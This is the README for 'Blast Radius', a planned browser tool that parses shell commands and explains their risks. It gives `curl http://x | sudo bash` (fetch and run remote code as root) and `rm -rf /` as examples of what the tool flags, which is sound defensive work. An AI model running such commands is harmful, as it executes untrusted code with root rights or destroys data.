# Blast Radius

Paste a shell command or script and get a plain-English risk breakdown — what it deletes,
where it fetches from and pipes to, what needs root — before you run something an agent just
handed you.

## Why

Copy-pasting shell one-liners from Stack Overflow, install docs, or an AI agent's output is
routine, and routinely risky. The standard advice — "read it first" — doesn't scale when the
command is a 40-token pipeline of redirects and pipes. Most "is this safe" tools are keyword
blocklists that miss intent (`rm -rf ./build` and `rm -rf /` trip the same regex). Blast Radius
actually parses the shell syntax — pipelines, redirects, command separators, `sudo` scope,
remote fetch-and-execute — and reasons about what the command *does*, not just what words it
contains.

Paste `curl http://x | sudo bash` and see it flagged red with a one-line explanation of exactly
why, right next to a harmless command flagged green for contrast.

## Planned features

- A real shell-syntax tokenizer and parser (not a regex blocklist): pipelines, redirects,
  `&&`/`||`/`;` sequencing, quoting.
- A risk rule engine that reasons about intent: destructive filesystem ops scoped by target,
  remote-fetch-and-execute patterns, `sudo`/root scope, outbound network + exfiltration shape,
  redirects into sensitive paths.
- Plain-English, one-line explanations per finding — not just a severity badge.
- A live paste-and-analyze UI with side-by-side red/green examples as the landing demo.
- Shareable permalinks that encode the pasted command for reproducing a flagged example.
- Zero network calls: analysis is 100% client-side, nothing you paste ever leaves the browser.

## Stack

Vanilla TypeScript, built with [Vite](https://vitejs.dev/), tested with
[Vitest](https://vitest.dev/). No framework, no backend — a static site that ships as a single
`dist/` directory and runs entirely in the browser.

See [`docs/VISION.md`](docs/VISION.md) for the design rationale and
[`docs/BACKLOG.md`](docs/BACKLOG.md) for the build plan.

## Development

```bash
npm install
npm run dev       # local dev server
npm test          # unit tests
npm run build     # static build to dist/
```

## License

MIT — see [LICENSE](LICENSE).
